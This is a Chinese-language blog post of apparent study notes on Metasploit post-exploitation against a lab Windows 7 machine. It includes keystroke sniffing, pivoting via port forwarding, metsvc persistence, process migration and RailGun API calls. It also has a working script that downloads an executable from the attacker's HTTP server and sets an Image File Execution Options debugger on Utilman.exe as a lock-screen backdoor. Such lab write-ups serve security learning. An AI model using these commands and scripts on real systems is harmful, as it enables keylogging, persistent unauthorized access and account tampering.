---
title: MasterMsf 2 定制Metasploit Part 3
category: metasploit
---

# {{ page.title }}

## Meterpreter其他功能介绍

在第一章的渗透测试过程中我们已经使用过一些脚本，如

[这里](http://www.scadahackr.com/library/Documents/Cheat_Sheets/Hacking%20-%20Meterpreter%20Cheat%20%20Sheet.pdf)有一份Meterpreter速查表。

有一些到目前为止还没有使用过的功能，但比较有意思的，这里列举一下：

- 键盘嗅探

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
<Left Windows>notepad<CR>
<Shift>Long time no see<CR>
<Shift>How are you<^Left Windows>

meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

![Screen Shot 2018-10-23 at 3.27.07 PM.png]({{ site.url }}/images/metasploit/B4C6B53C93726B862419B959B23F4C01.png)

- 检查是否处于虚拟机环境

```
meterpreter > run checkvm

[!] Meterpreter scripts are deprecated. Try post/windows/gather/checkvm.
[!] Example: run post/windows/gather/checkvm OPTION=value [...]
[*] Checking if target is a Virtual Machine .....
[*] This is a VMware Virtual Machine
```

- 端口转发

与第一章的情况类似，现在是：我们拿下了`172.16.56.108`的Win7的Meterpreter，这个Win7的另一个网卡`192.168.6.110`所在网段有一个Web服务器`192.168.6.128`，它能够访问这个Web服务器，但攻击者不行。攻击者希望能够用自己的浏览器去访问这个Web服务器。

首先看一下，Win7确实能访问：

![Screen Shot 2018-10-23 at 3.55.33 PM.png]({{ site.url }}/images/metasploit/280864CBEE078AB6C6576447DB9560A4.png)

此时我们在Win7的Meterpreter内已经使用autoroute建立了到内网的路由

```
run autoroute -s 192.168.6.0/24
```

然而浏览器是无法访问的，因为浏览器不能通过Meterpreter传递流量：

![Screen Shot 2018-10-23 at 3.44.38 PM.png]({{ site.url }}/images/metasploit/F7E22F6B4BFA89E16E63D412FE023FE8.png)

我们在Meterpreter建立端口转发：

```
meterpreter > portfwd add -L 127.0.0.1 -l 1080 -r 192.168.6.128 -p 80
[*] Local TCP relay created: 127.0.0.1:1080 <-> 192.168.6.128:80
```

然后在Firefox中设置代理，这样就能够访问内网Web服务器了：

![Screen Shot 2018-10-23 at 3.58.17 PM.png]({{ site.url }}/images/metasploit/EA357C022B2B8C7D2AC0B22512DFF8A0.png)

当然，你也可以通过利用Meterpreter设置一个socks代理去达到这个功能。

- 持久化

之前提到过使用`persistence`，这里介绍`metsvc`。它以系统服务形式运行，会打开目标主机上的一个端口，这个端口会永久向攻击者开放。

```
meterpreter > run metsvc -A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\rambo\AppData\Local\Temp\QsmuhVgOAZUD...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
	 * Installing service metsvc
 * Starting service
Service metsvc successfully installed.
```

以后有需要就可以连接：

```bash
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set RHOST 172.16.56.108
set LPORT 31337
```

然而我这里失败了，session刚打开就自动关闭，多次尝试都是这样：

```
[*] Started bind TCP handler against 172.16.56.108:31337
[*] Meterpreter session 13 opened (172.16.56.1:53474 -> 172.16.56.108:31337) at 2018-10-23 16:05:32 +0800
[*] 172.16.56.108 - Meterpreter session 13 closed.  Reason: Died
```

并且Meterpreter还会卡在那里，直到我按ctrl-c。可以看到服务确实起来了且有监听端口：

![Screen Shot 2018-10-23 at 4.29.02 PM.png]({{ site.url }}/images/metasploit/8A21833291CC5929493DC4789D8F537A.png)

![Screen Shot 2018-10-23 at 4.29.24 PM.png]({{ site.url }}/images/metasploit/5992A5CB7C5F690CAB2C040697BED811.png)

参考[这篇文章](http://legacy.popped.io/2013/10/fixing-metsvc.html)，我搜索了一下本地文件：

```bash
find ./ -name "metsrv*"

.//embedded/lib/ruby/gems/2.4.0/gems/metasploit-payloads-1.3.52/data/meterpreter/metsrv.x64.dll
.//embedded/lib/ruby/gems/2.4.0/gems/metasploit-payloads-1.3.52/data/meterpreter/metsrv.x86.dll
```

发现果然有两个不同版本的dll文件。而`metsvc`这个脚本没有判断目标系统架构就直接使用了x86版：

```ruby
  # Use an array of `from -> to` associations so that things
  # such as metsrv can be copied from the appropriate location
  # but named correctly on the target.
  bins = {
    'metsrv.x86.dll'    => 'metsrv.dll',
    'metsvc-server.exe' => nil,
    'metsvc.exe'        => nil
  }

  bins.each do |from, to|
    next if (from != "metsvc.exe" and remove)
    to ||= from
    print_status(" >> Uploading #{from}...")
    fd = client.fs.file.new(tempdir + "\\" + to, "wb")
    path = (from == 'metsrv.x86.dll') ? MetasploitPayloads.meterpreter_path('metsrv','x86.dll') : File.join(based, from)
    fd.write(::File.read(path, ::File.size(path)))
    fd.close
  end
```

我把它改成了x64版，然后重新`run metsvc`，这次可以确认x64库文件被传输到靶机上了。然而，情况还是一样，又失败了。

我看到安全脉搏的文章[metasploit在后渗透中的作用](https://www.secpulse.com/archives/69766.html)中其实也失败了，不过似乎作者没注意到。

好吧，这个问题先到此为止。

注：这些脚本都放在`scripts/meterpreter/`中，可以读源码了解其原理。

## 编写Meterpreter脚本

Meterpreter编程基础：

- API调用
- mixins类

之前已经简单介绍过mixins，还可以参考[Metasploit Mixins and Plugins](https://www.offensive-security.com/metasploit-unleashed/mixins-plugins/)来了解它和插件之间的关系。

作者建议深入了解以下文件：

```
ls rex/post/meterpreter
channel.rb                client.rb                 extension.rb              object_aliases.rb         packet_parser.rb          pivot_container.rb
channel_container.rb      client_core.rb            extensions                packet.rb                 packet_response_waiter.rb ui
channels                  dependencies.rb           inbound_packet_handler.rb packet_dispatcher.rb      pivot.rb

ls msf/scripts/meterpreter
accounts.rb common.rb   file.rb     registry.rb services.rb
```

打开`msf/scripts/meterpreter`中的文件可以发现，其中没有任何函数，但是它们有各种include。后面编写Meterpreter脚本正是基于这些文件来实现功能的。

API调用将在下一个部分`RailGun`中介绍。

下面来编写一段Meterpreter脚本，来实现进程迁移：

```ruby
if(is_admin?)
    print_good("Current user is admin.")
else
    print_error("Current user is not admin.")
end

session.sys.process.get_processes().each do |x|
    if x['name'].downcase == 'explorer.exe'
        print_good("explorer.exe is running with PID #{x['pid']}")
        explorer_ppid = x['pid'].to_i
        print_good("Migrating to explorer.exe at PID #{explorer_ppid.to_s}")
        session.core.migrate(explorer_ppid)
    end
end
```

把它放在`scripts/meterpreter/`中。

这个也遇到了之前的问题，迁入进程总失败。可能计算机玄学的道行还不够吧。

最后，官方已经不建议去写Meterpreter脚本，而应该去写后渗透模块。

## RailGun

### 了解RailGun

RailGun允许你在不编译自己的DLL文件情况下直接调用Windows API。

在meterpreter中首先切换到irb命令行：

```
meterpreter > irb
[*] Starting IRB shell...
[*] You are in the "client" (session) object

irb: warn: can't alias kill from irb_kill.
>>
```

然后好戏就开始了（作者说有些任务Metasploit不能胜任，RailGun却可以顺利完成）。

我们通过以下方法调用基础API：

```ruby
railgun.DLLname.function(parameters)
```

锁屏测试：

```
>> railgun.user32.LockWorkStation()
=> {"GetLastError"=>0, "ErrorMessage"=>"\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3", "return"=>true}
```

![Screen Shot 2018-10-23 at 8.14.26 PM.png]({{ site.url }}/images/metasploit/5894AA37075F2A7593E027E1360AD10F.png)

删除用户测试（要`getsystem`）：

首先创建测试用户：

![Screen Shot 2018-10-23 at 8.32.52 PM.png]({{ site.url }}/images/metasploit/2AA465B886AD1F8FE6805000A097A26D.png)

```
>> railgun.netapi32.NetUserDel(nil, "msfadmin")
=> {"GetLastError"=>997, "ErrorMessage"=>"FormatMessage failed to retrieve the error.", "return"=>0}
```

结果：

![Screen Shot 2018-10-23 at 8.33.50 PM.png]({{ site.url }}/images/metasploit/6F4AFEEC73E367DEA7F4181C31DFCF01.png)

弹窗测试：

```
railgun.user32.MessageBoxA(0, "YOU ARE HACKED!!!", "Alarm", nil)
```

![Screen Shot 2018-10-23 at 8.39.20 PM.png]({{ site.url }}/images/metasploit/040DF785F0D4CE2E3DF9B43A538329AD.png)

为了更顺利地使用RailGun，我们必须明确哪个DLL包含了哪个方法。

### 构建复杂RailGun脚本

本节实现以下脚本：

1. my_urlmon.rb 目的是向目标系统中的`urlmon.dll`添加函数`URLDownloadToFileA`
2. my_railgun_demo.rb 目的是调用前面添加的下载函数，从攻击者机器上下载一个文件管理器`a43.exe`，并用它替换掉Windows锁屏界面上的“轻松访问”按钮对应程序

首先是添加函数的脚本：

```ruby
# my_urlmon.rb
if client.railgun.get_dll('urlmon') == nil
    print_status("Adding Function")
end
client.railgun.add_dll('urlmon', 'C:\\WINDOWS\\system32\\urlmon.dll')
client.railgun.add_function('urlmon', 'URLDownloadToFileA', 'DWORD', [
['DWORD', 'pcaller', 'in'],
['PCHAR', 'szURL', 'in'],
['PCHAR', 'szFileName', 'in'],
['DWORD', 'Reserved', 'in'],
['DWORD', 'lpfnCB', 'in'],
])
```

参考[Method: Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::Railgun#add_function](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Railgun/Railgun)：

```c
/* Adds a DLL to this Railgun.
 * The windows_name is the name used on the remote 
 * system and should be set appropriately if you want to 
 * include a path or the DLL name contains non-ruby-approved characters.
 * Raises an exception if a dll with the given name has already been defined. */
add_dll(dll_name, windows_name = dll_name)

/* Adds a function to an existing DLL definition.
 * If the DLL definition is frozen (ideally this 
 * should be the case for all cached dlls) an unfrozen copy is 
 * created and used henceforth for this instance. */
add_function(dll_name, function_name, return_type, params, windows_name = nil, calling_conv = "stdcall")
```

我观察过，在添加前后，硬盘上的`urlmon.dll`的大小没有变化，所以这个添加操作应该是在内存中生效的？

关于这个下载函数的详细信息，参考[URLDownloadToFile function](https://technet.microsoft.com/en-us/windows/ms775123(v=vs.60))。其原型为：

```c
HRESULT URLDownloadToFile(
             LPUNKNOWN            pCaller,
             LPCTSTR              szURL,
             LPCTSTR              szFileName,
  _Reserved_ DWORD                dwReserved,
             LPBINDSTATUSCALLBACK lpfnCB
);
```

接着是调用函数下载文件并替换注册表的脚本：

```ruby
# my_railgun_demo.rb
mypath = "C:\\Users\\rambo\\Desktop\\a43.exe"
client.railgun.urlmon.URLDownloadToFileA(0, "http://172.16.56.1:8000/a43.exe",
                                        mypath, 0, 0)
key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe"
syskey = registry_createkey(key)
registry_setvaldata(key, 'Debugger', mypath, 'REG_SZ')
```

测试：

攻击者开启HTTP服务器并把文件管理器放在根目录：

```
python -m http.server

172.16.56.108 - - [23/Oct/2018 21:02:49] "GET /a43.exe HTTP/1.1" 200 -
```

运行脚本：

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > run my_urlmon
[*] Adding Function

meterpreter > run my_railgun_demo
```

果然，锁屏（可以用之前的RailGun方法让目标机器锁屏）后点击“轻松访问”，出现了文件管理器！

![Screen Shot 2018-10-23 at 9.24.49 PM.png]({{ site.url }}/images/metasploit/464EF9AE39AFC39433AA0710DFABEEBF.png)

现在，能够接触这台计算机的人无需登陆系统，就可以通过这个文件管理器实现各种功能了。太厉害了。

关于RailGun的更多信息可以参考[How to use Railgun for Windows post exploitation](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation)。

## 总结

基础挺重要的，将来抽时间学一下Ruby吧，这样回过头来看，许多疑问应该就可以迎刃而解。当然了，先研究Metasploit，在这个过程中缺啥补啥，最后带着问题去学Ruby，也是个不错的选择。

另外呢，这些代码看起来都不是很难，但是要想写出好的模块和脚本，需要深厚的系统知识功底。至少在这里，丰富的Windows API知识和注册表知识会为你的攻击提供很多灵感。

关于开发模块的更多信息，可以参考[rapid7/metasploit-framework:wiki](https://github.com/rapid7/metasploit-framework/wiki)。